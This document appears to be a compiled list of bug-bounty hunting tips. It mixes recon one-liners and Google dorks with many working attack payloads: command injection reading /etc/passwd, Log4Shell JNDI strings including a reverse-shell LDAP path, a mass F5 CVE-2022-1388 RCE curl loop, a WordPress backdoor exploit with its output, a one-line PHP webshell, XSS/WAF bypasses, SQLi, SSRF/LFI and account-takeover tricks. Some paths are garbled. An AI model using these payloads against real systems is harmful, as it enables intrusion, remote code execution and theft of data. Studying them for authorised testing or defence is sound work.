  sed 's/$/\/?__proto__[testparam]=exploit\//' alive.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULN"
  1/2
- CVE-2021-24146 "Modern Events Calendar Lite 5.16.5 - Unauthenticated Events Export"
  POC: target[.]com/wp-admin/admin.php?page=MEC-ix&tab=MEC-export&mec-ix-action=export-events&format=xml
  POC VIDEO: https://evil.com
- TamronOS IPTV/VOD RCE
  POC: http://target[.]com/api/ping?count=5&host=;cat /etc/passwd;&port=80&source=1.1.1.1&type=icmp
- Open redirect payloads:
  //#//google.com/
  //www.google.com/%2f%2e%2e
  //www.google.com/%2e%2e
  //;
  .com
  //%09/google.com
  //%http://5cgoogle.com
  //google.com/..;/css
  //\http://google.com
  //%EF%B9%B0/https://google.com
- After getting only duplicates, keep going — put an XSS Hunter payload into Burp's match-and-replace:
  1. User agent
  2. Referer Header
- Fetch historical robots.txt snapshots from the Wayback CDX API:
  curl -ks "http://web.archive.org/cdx/search/cdx?url=domain.tld/robots.txt&fl=timestamp&output=text&from=2020&to=2021…"|sort -u|xargs -I{} -P500 -n1 bash -c 'echo "https://web.archive.org/web/"{}"if_/https://domain.tld/robots.txt"'
- Drupal file paths worth trying:
  /admin/content/assets/add//admin/content/assets/manage//file/ajax/field_asset_
- Two sensitive files that you can add to your automation while fuzzing Wordpress based websites:
  /wp-config.php.bak --> A lot of leaked info including database credentials.
  /wp-content/debug.log --> All PHP related debug data.
- -TIP 13/31-
  How to find detailed errors in APIs?
  1. Send a string instead of a number (age=ddd)
  2. Remove necessary params (e.g, send a PM and remove "receiver_name" param)
  3. Break JSON structure (remove '}')
  4. Remove necessary headers/cookies
- Making a wordlist for your target..
  1. 'Cewl'
  > cewl - m 4 - w /wordlist1. txt - d target. com
  2.urls > cat urls.txt | cut -d “/” -f4,5,6,7,8,9 | tee wordlist2. txt
  3.github endpoints
  (https://github.com/gwen001/github-endpoints…)
  github-endpoints target. com - raw - o /wordlist3. txt
- One Liner http status code
  for url in $(cat alive_sub.txt);do curl -o /dev/null -s -w "%{http_code} -> " $url;echo $url;done
- Sometimes 👏
  GET /api/users/1 > 200 { your data }
  GET /api/users/2 > 401 { Not authorised }
  Try
  DELETE /api/users/2 > you know what 😂
- Got SSRF/LFI using Open Graph Protocol , Server was parsing thumbnail using og:image property , Crafted a page by putting <meta property="og:image" content="file:///etc/passwd"/> to pull local file, Similar approach used to solve @bugpoc_official CTF⬇️
- GET /api/billing/id ==> 403
  POST /api/billing/id ==> 200
- Unauthenticated Enumeration
  GET https://Redacted/api/v3/users
  Response: Permission Denied
  GET https://Redacted/api/v4/users
  Response: Permission Denied
  Dirsearch : /users/1,2,3...
  "Id": 1, "Name":abc, "Username":abcd, "Public_email:
- 1. Only Admin can create Sub-values & Hide Sub-values
  2. User can't see Sub-values now
  3. As User capture request while creating "Value"
  4. Add custom variables manually on request as:
  variables:{"subValues":[]}
  5. Sub-values revealed on response
- Extract all endpoints from a JS File with this one-liner.
  cat files.txt | grep -aoP "(?<=(\"|\'|`))\/[a-zA-Z0-9?&=\/-#.](?=(\"|\'|`))" | sort -u | tee output.txt
- 👉Search JS using Gau + grep 👈
  gau -subs DOMAIN |grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> js.txt
- curl -s "https://jldc.me/anubis/subdomains/att.com…" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | anew 🤠
- GET http://legacysite.target.com -> 403
  POST http://legacysite.target.com -> 200
- want find an easy P1 run gau yourtrget |grep .zip
  you may find an ZIP FILE contain all the source code or other sensitive backup files
- Tip:
  1. Collab capture request on share as:
  Post /shares
  2. Collabs don't have Send Proposal feature on UI
  3. Collab change that request to:
  Post /data_requests/id/send_proposal
  4. Proposal sent from Collab context to Requestor
- Hunting on Government sites.
  site:*.gov.* "responsible disclosure"
- Server directory traversal (JBoss WEB-INF):
  1 - http://test.test.com/home/app
  2 - http://test.test.com/home/app//../.EB-INF/web.xml…
  3 - in response :
  ( the web.xml code )
- A cool directory traversal bypass :
  %252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
  Directory traversal with double URL
  encoding
  C2C
- Google dorks for finding private programs:
  inurl:security-program intext:bug bounty
  intext:report a bug intext:reward
  intext:"our bug bounty program" "reward"
  1/2
- WordPress user enumeration: append /wp-json/wp/v2/users to each domain — awk '{print $0,"/wp-json/wp/v2/users"}' ./domain.txt > ./wpusers.txt
- bug-bounty-dorks :
  inurl /bug bounty
  inurl : / security
  inurl:security.txt
  inurl:security "reward"
  inurl : /responsible disclosure
- Some more Google Dorks to find Private VDP:
  inurl:bug-bounty intext:cash rewards
  site:security.*.com intext:bug bounty
  site:security.*.* inurl: bounty
  vulnerability detection program reward
  intext:Cryptocurrency Exchange intext:Bug bounty
  1/2
- Full account takeover
  GET /api/users/1337 => 401
  GET /api/users/
  x-user-id: 1337
  =>> 200 Ok
  POST /api/users/<myID>/password-reset
  x-user-id: <victimID>
- Email Header Injection:
  1) "%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com
  2) "recipient@test.com>\r\nRCPT TO:<victim+"@test.com
- Open Redirect:
  export LHOST="http://localhost"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
- Extract sensitive end-point in JS:
  cat main.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
- Hackerone scope targets:
  curl -sL https://github.com/arkadiyt/bounty-targets-data/blob/master/data/hackerone_data.json?raw=true… | jq -r '.[].targets.in_scope[] | [.asset_identifier, .asset_type] | @tsv'
- cat urls.txt | qsreplace "?admin=true" | gau | phpgcc | anew | kxss | awk -v -q txt | sed 's/http/\nhttp/g' | grep ^http | sed 's/\(^http[^ <]*\)\(.*\)/\1/g' | grep -vi -e dalfox -e lElLxtainw| sort -u | waybackurls
- inurl:/axis2/axis2-web/HappyAxis.jsp
- Step 2-
  for url in $(cat robots-url.txt);do http -b $url | grep 'Disallow' | awk -F ' ' '{print $2}' | cut -c 2- | anew robot-words.txt;done
  Credit : @remonsec
- Zabbix dashboard without authentication:
  1- https://domain. com/zabbix/zabbix.php ❌
  2- https://domain. com/zabbix/zabbix.php?action=dashboard.list ✔️
- qsreplace may sometimes give you errors or sometimes unable to parse the query but this always works.
  gau target[.]tld --threads 20 --subs | sed -e 's/=[^&]*/=FUZZ/g'
- 1. Open burpsuite
  2. Capture website requests
  3. Send your request to repeater
  4. Change user agent to unknown name. Or try some special characters like( ' " )
  5. If you got an error message. Congratulations you got something.
- phpinfo disclosure paths:
  /phptest.php?do=info
  /pi.php
  /test.php
  /info.php
- Tip:
  1. Capture request on add reaction
  {"like":1}
  2. Change the value to negative number
  {"like": -100}
  3. Post reactions reach to negative value
- Searchsploit also takes nmap XML format output.
  Very helpful to get the potential exploit.
  :~nmap -sV -oX portscan.xml $IP
  :~searchsploit --nmap portscan.xml -w -t
- Struts2 target? Check for Log4Shell with:
  curl -vv -H "If-Modified-Since: \${jndi:ldap://localhost:80/abc}" http://localhost:8080/struts2-showcase/struts/utils.js
- Check the Java version first — if it is not vulnerable, move on:
  ${jndi:ldap://${env:JAVA_VERSION}.5ou7zt0bj640uqc0bsy1hvyrpiv8jx.burpcollaborator.net}
- Testing every header for Log4j: use Burp Intruder Pitchfork and set both payloads to the header values:
  ${jndi:ldap://${hostName}.§§.${sys:java.version}.cb.io}
  → reveals which header is vulnerable.
- apache solr EXP log4j
  /solr/admin/collections?action=${jndi:ldap://xxx/Basic/ReverseShell/ip/9999}&wt=json
- Dork for PII-bearing pages:
  site:"*.domain.tld" intext:"phone"|number intext:"email"|address intext:"personal" intext:address intext:name|last -support -news -vendor -docs -help
- Grep subdomains from JS files using
  cat test.js | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+"
- Using chrome heap snapshots to find hidden API Endpoints:
  - Open Chrome developer toolkit
  - Go to Memory Tab and Click Record Button
  - Save the Snapshot and start grepping stuff
  Example : cat Heap-xx.heatsnapshot | grep '/api'
- For WordPress wp-config file, if the main endpoint is forbidden we can also check for the backup file
  redacted[.]com/wp-config.php => 403 Forbidden
  redacted[.]com/wp-config.php_orig => 200 OK
- If the main endpoint is forbidden we can also check for the backup file.
  /blog/wp-config.php => 403 Forbidden
  /blog/wp-config.php.bkp => 200 OK
- Finding Sensitive Files for Bug-Bounty Hunting (Part-3) :-
  -> /.git
  -> /.git-rewrite
  -> /.git/HEAD
  -> /.git/index
  -> /.git/logs
  -> /.gitattributes
  -> /.gitconfig
  -> /.gitkeep
  -> /.gitmodules
  -> /.gitreview
  -> /.svn/entries
  -> /.svnignore
- Found HTML Injection and looking to demonstrate impact? Try chaining with SSRF by injecting an iframe.
  <iframe src=file:///etc/passwd></iframe>
  @faizannehal1 has a great write-up explaining more at https://faizannehal.medium.com
- Find sensitive information with AlienVault OTX:
  curl -s "https://otx.alienvault.com/api/v1/indicators/domain/…<TARGET>/url_list?limit=100&page=1" | jq -r '.url_list[].url'
- Command injection with no shell (noshell user) and behind Cloudflare + LiteSpeed WAF: /etc/passwd was blocked, globbing got it — /e*c/p*s*we
- “Pay attention to scopes and bug bounties and don’t cross the line” - @thedawgyg
  @thedawgyg Dorks:
  site:.mil ext:php intitle:Setup
  site:.mil ext:pdf intitle:Setup
  site:.mil inurl:”img_url"
  site:.mil inurl:”/admin/”
  site:.mil inurl:”/api/”
- /favicon.ico/..%2f
  %23
  /../../../
  ?debug=1
  /server-status
  /files/..%2f..%2f
- A tip to convert HTML injection to RXSS!
  HTML injection --> https://host.com/?param=<Html_Injection_Payload>
  RXSS --> https://host.com/?param=%3Ciframe%20src=%22javascript:alert(document.domain)%22%3E%3C/iframe%3E…
  Description is in the first comment!
- Get LFD
  index.php?path=web;cat /etc/passwd;# xx
  3/n
- “Pay attention to scopes and bug bounties and don’t cross the line”
  @thedawgyg Dorks:
  site:.mil ext:php intitle:Setup
  site:.mil ext:pdf intitle:Setup
  site:.mil inurl:”img_url"
  site:.mil inurl:”/admin/”
  site:.mil inurl:”/api/”
- Hunt programs that are not listed on the major platforms:
  inurl:/responsible-disclosure "reward"
  A repo with open targets: https://github.com/bughunterlabs/open-bounty-targets…
- Open Redirection:
  Tip:
  https://target[.]com///google[.]com/ --> 404 Not found
  https://target[.]com///google[.]com/?qwerty --> Redirects to google[.]com
- Bug-Bounty tip
  Some interesting path to be in your findings after an RCE (if possible) :-
  -> /var/log
  -> /var/spool/crony
  -> /etc/cron.*
  -> /etc/group
  -> /etc/passed
  -> /var/log/btmp
- Find scripts:
  site:http://test.com ext:php
  site:http://test.com ext:asp
- Bug Bounty Dorks
  inurl /bug bounty
  inurl : / security
  inurl:security.txt
  inurl:security "reward"
  inurl : /responsible disclosure
  inurl : /responsible-disclosure/ reward
  inurl : / responsible-disclosure/ swag
  inurl : / responsible-disclosure/ bounty
- inurl:'/responsible disclosure' hoodie
  responsible disclosure swag r=h:com
  responsible disclosure hall of fame
  responsible disclosure europe
  responsible disclosure white hat
  insite:"responsible disclosure" -inurl:nl
  intext responsible disclosure
- inurl:'vulnerability-disclosure-policy' reward
  intext:Vulnerability Disclosure site:nl
  intext:Vulnerability Disclosure site:eu
  site:*.*.nl intext:security report reward
  site:*.*.nl intext:responsible disclosure reward
- "responsible disclosure" university
  inurl:/responsible-disclosure/ university
  buy bitcoins "bug bounty"
  inurl:/security ext:txt "contact"
  intext:responsible disclosure bounty
  inurl: private bugbountyprogram
  inurl:/.well-known/security ext:txt
- intext:"BugBounty" and intext:"BTC" and intext:"reward"
  intext:bounty inurl:/security
  inurl:"bug bounty" and intext:"€" and inurl:/security
  inurl:"bug bounty" and intext:"$" and inurl:/security
  inurl:"bug bounty" and intext:"INR" and inurl:/security
- /api/v1/user/18739 = 403
  /api/v2/user/18739 = 200 success
  Tip: try to change api version
- Top Vulnerable Parameters
  1. ?cmd={payload}
  2. ?exec={payload}
  3. ?command={payload}
  4. ?execute={payload}
  5. ?ping={payload}
  6. ?query={payload}
  7. ?jump={payload}
  8. ?code={payload}
  9. ?reg={payload}
  10. ?do={payload}
- How to find websites to do bug bounties?
  >> Search this dorks on google!
  1. intext:"responsible disclosure"
  2. intext:"bug bounty reward"
  3.intext:"bug bounty program reward"
  4. inurl:security intext:"bug bounty reward"
  Enjoy :)
- You can input "url:file:///etc/passwd" or "url:http://127.0.0.1:8080" to bypass the Java's URL protocol check like that:
- CVE-2022-0378 -POC (One Liner)
  👇👇
  cat file.txt | while read h do;do curl -sk --insecure "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && \echo "$h : vuln" || echo "$h : Not";done
- Some dorks for find easy bugs:
  site:.eu responsible disclosure
  inurl:index.php?id=
  site:.nl bug bounty
  “index of” inurl:wp-content/
- Cloudflare bypassed !!!
  "-alert(0)-" >>blocked "
  -top['al\x65rt']('sailay')-" >>passed
- Cloudflare bypassed !!!
  "-alert(0)-" >>blocked
  "-top['al\x65rt']('sailay')-" >>passed
  Credit : @s3c_krd
- Finding Sensitive Files
  -> /.git
  -> /.git-rewrite
  -> /.git/HEAD
  -> /.git/index
  -> /.git/logs
  -> /.gitattributes
  -> /.gitconfig
  -> /.gitkeep
  -> /.gitmodules
  -> /.gitreview
  -> /.svn/entries
  -> /.svnignore
  Ref: Sandip Das
- Easily scrape URLs from a webpage with curl and grep: @spiderfoot
  curl https://spiderfoot.net | grep -Eo "(http|https)://[a-zA-Z0-9./?=_%:-]*" | sort -u
- Came across 403 Forbidden Error for Spring Actuator endpoint and bypassed within minutes.
  https://x.x.x.x/api-gateway/actuator/env -> 403 Forbidden
  https://x.x.x.x/api-gateway//actuator/env -> 200 OK
- GET /user/manage.php -> 403
  GET /user/manage.php?admin=1 -> 200
- Finding Sensitive Files
  -> /.git
  -> /.git-rewrite
  -> /.git/HEAD
  -> /.git/index
  -> /.git/logs
  -> /.gitattributes
  -> /.gitconfig
  -> /.gitkeep
  -> /.gitmodules
  -> /.gitreview
  -> /.svn/entries
  -> /.svnignore
- This “Unsubscribe” option can give you P3 level issue.
  1. Click on link
  2. Domain maybe: email. domain. com
  3. echo email. domain. com | waybackurls
  You’ll get links to unsubscribe other user who paid for subscription
- Simple payload (2 valid reports in 7 minutes):
  ";alert(document.domain);/*;var%20dk4trin="*/";
- If the Host: company redirect to "Location: thirdparty/" Try to find open redirect on "thirdparty" domain and call
  GET /?uri=payload HTTP/1.1
  Host: companydomain
  response
  Location: thirdpart/?uri=payload redirects to your own domain (chain it with another bug).
- Smallest PHP webshell:
  <?=`$_GET[x]`?>
- bug bounty DORks
  inurl/bug bounty
  inurl:/ security
  inurl:security.txt
  inurl:security "reward"
  inurl: /responsible disclosure
  inurl: /responsible disclosure/reward
  inurl: /responsible-disclosure-swge
  inurl: /responsible-disclosure/bounty
- Usefull tip to fuzzers:
  - Adding a "/FUZZ" at the end of the line of a given file
  $ cat subdomains.txt | sed 's/.*/&\/FUZZ/'
  - Note: It's going to also add a "/", if you don't want to, just use the following instead: sed 's/.*/&FUZZ/'
- TIP:
  File path traversal, traversal sequences blocked with absolute path bypass:-
  payload:-/etc/passwd
- Tip:
  HTML attribute context:
  <a href="http://test.com/search?word=test…"/>
  payload: <a href="http://test.." onclick = "alert(1)"/>
- Pastebin dorks:
  inurl:pastebin*com starbucks*com
  inurl:gist.github starbucks*com
  inurl:ghostbin*com starbucks*com
- echo -e "HTTP/1.1 302 Found\nContent-Type: application/json\nLocation: http://127.0.0.1\n" | sudo nc -l -s 64.227.116.98 -p 8080 -q 1
  1/1
- Dorks for finding bounty programmes:
  -> inurl:security intext:"reward bug bounty"
  -> inurl:"responsible disclosure" intext:"$ reward"
  --> inurl:"security" intext:"bounty reward"
- Testing open redir3ct:
  --------🐼
  waybackurl target | grep -a -i \=http | qsreplace 'http://evil.com' | while read url; do curl -s -L $url -I |grep "http://evil.com" && echo -e "$host is Vulnerable"
- Exploit F5 Big IP Using Curl
  CVE-2022-1388
  cat ips.txt | while read ip; do curl -su admin -H "Content-Type: application/json" http://$ip/mgmt/tm/util/bash -d '{"command":"run","utilCmdArgs":"-c id"}';done
- Open Redirect vulnerable Params-
  /{payload}
   ?next={payload}
   ?url={payload}
   ?target={payload}
   ?rurl={payload}
   ?dest={payload}
   ?destination={payload}
   ?redir={payload}
   ?redirect_url={payload}
   ?redirect={payload}
  1/n
- <input type=text style="display:block;transition:outline 1s;" ontransitionend=alert(1) id=x tabindex=1>
  After inserting the code below, if focus is obtained, such as clicking the input area, ontransitionend is activated and alert(1) is executed.
- 21.?port={target}
  22.?to={target}
  23.?out={target}
  24.?view={target}
  25.?dir={target}
- Finding Sensitive Files by bruteforcing these in Web paths
  -> /.git
  -> /.git-rewrite
  -> /.git/HEAD
  -> /.git/index
  -> /.git/logs
  -> /.gitattributes
  -> /.gitconfig
  -> /.gitkeep
  -> /.gitmodules
  -> /.gitreview
  -> /.svn/entries
  -> /.svnignore
- CVE-2022-1609 WordPress Weblizar Backdoor
  $ curl -s -d 'blowfish=1' -d "blowf=system('id');" 'http://localhost:8888/wp-json/am-member/license'
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
- Tomcat path traversal via nginx reverse-proxy mapping with the /..;/ payload
  Example: image/..;/hidden
  Attack Flow:
  -> image/..;/hidden (nginx input)
  -> image/../hidden (tomcat)
  -> hidden (final path)
- SQLi confirmation when sleep/wait payloads fail: on PostgreSQL use pg_sleep().
- (Use as a prefix)
  3) ?parameter=https://your-server[payload]Targetdom/ => 200 Ok
  Here replace “[payload]” with “?” or “\@” symbols.
  1/2
- HTTP parameter pollution technique to gain idors:✅
  ▶️GET /api_v1/messages?user_id=ANOTHER_USERS_ID
  ▶️GET /api_v1/messages?user_id=YOUR_USER_ID&user_id=ANOTHER_USERS_ID
  ▶️GET /api_v1/messages?user_id=ANOTHER_USERS_ID&user_id=YOUR_USER_ID
- 📌 When looking for IDORs and have 401/403 errors, some bypasses :
  - Wrap ID with an array {“id”:111} --> {“id”:[111]}
  - JSON wrap {“id”:111} --> {“id”:{“id”:111}}
  - Send ID twice URL?id=<LEGIT>&id=<VICTIM>
  - Send wildcard {""user_id"":""*""}
- Cisco Switch
  inurl:/config/log_off_page.htm
- FIREBASE init file :
  .firebaseapp.com/__/firebase/init.js
  .firebaseapp.com/__/firebase/init.json
  or try to add /__/firebase/init.js to your FFUZ list when you serach subdomin
  also dont forget to add /.json
- From here use this to gain the admin console
  credits @_bughunter
  Always go for debug parameters in sensitive endpoints
  debug=true
  _debug=true
  debug=1
  _debug=1
  target/admin/console ==> 403 ❗️
  target/admin/console?debug=true ==> 200
- [BB Tips]
  When you find a path like "toto/titi.php" with the dir "toto/" in 403 and it doesn't tell you anything, don't hesitate to do a google search <index of "toto/"> and see what the sites that have this directory open propose (ex in pic)
- Bypass SSRF filters via different url scheme:✅
  ▶️HTTP and File protocols:
  →ssrf.php?url=http://127.0.0.1:22
  →ssrf.php?url=http://127.0.0.1:80
  →srf.php?url=http://127.0.0.1:443
  →file://path/to/file
  →file:///etc/passwd
  →file://\/\/etc/passwd
- Two IDORS
  httpss://site.com/users/63636->changed the id ->403
  https://site.com/users/63635?userid=63635 -> 200
- Fuzz list for GIT and SVN files.
  /.git
  /.git-rewrite
  /.git/HEAD
  /.git/config
  /.git/index
  /.git/logs/
  /.git_release
  /.gitattributes
  /.gitconfig
  /.gitignore
  /.gitk
  /.gitkeep
  /.gitmodules
  /.gitreview
  /.svn
  /.svn/entries
  /.svnignore
- Gather all links to your target:
  cat hosts | sed 's/https\?:\/\///' | gau > urls.txt
- CVE-2022-38463: target/logout_redirect.do?sysparm_url=//j%5c%5cjavascript%3aalert(document.domain)
- Check if the company have a job board inside their WP website. You can find all the uploaded resumes/CV in most of the case.
  Dorks for CVE-2022-2544 & CVE-2022-2558 :
  inurl:wp-content/uploads/jobpost
  inurl:wp-content/uploads/wpjobboard
- Developers often fail to validate or configure paths properly in APIs:
  DELETE /cell-00012/api/1/companies/<company id>/namespaces/pid:9810956/analytic/<analytic id> HTTP/1.1
  Deletes another tenant's analytics — pid is a personal id.
- echo domain | cariddi -intensive | grep -Ev "(\.json|\.txt|\.xml\.js$|\.xml|\.css)" | sort -u | grep -E "\?[a-zA-Z0-9_-]+\=[a-zA-Z0-9_-]+" | uro | dalfox pipe
- SQL injection in the "x-requested-with:" header, payload "1 waitfor delay '0:0:5' --": below 3 ms delay had no effect, above 10 ms crashed the server with a 503.
- Bug :Local File Inclusion
  Payload : file:///etc/passwd
- Seventh way to call JavaScript functions without parentheses:
  [].sort.call`${alert}1337`
  Write-up: https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses…
- Open redirects on a VDP found with dorking alone:
  Tip: Use google Dorking to find paramters
  E.G: -inurl:return
  -inurl:redirect
  -inurl : uri && inurl: url
- A short write-up :
  HTTP Methods : POST
  Payloads: 'XOR(if(now()=sysdate(),sleep(20),0))XOR’Z
  Parameter :
  example_parameter='XOR(if(now()=sysdate(),sleep(20),0))XOR’Z
  (blind time-based SQLi confirmed)
  1/2
- PII leak on an unauthorized file:
  - dirsearch with @GodfatherOrwa's wordlist:
  Link:
  https://github.com/orwagodfather/WordList/blob/main/fuzz.txt…
  - /logs/ ===> 403
  - Diresearch again
  - /logs/user.txt
- Dir Fuzzing on all subdomains list
  cat livedomains.txt | dirsearch --stdin
  Or u can add your own wordlist
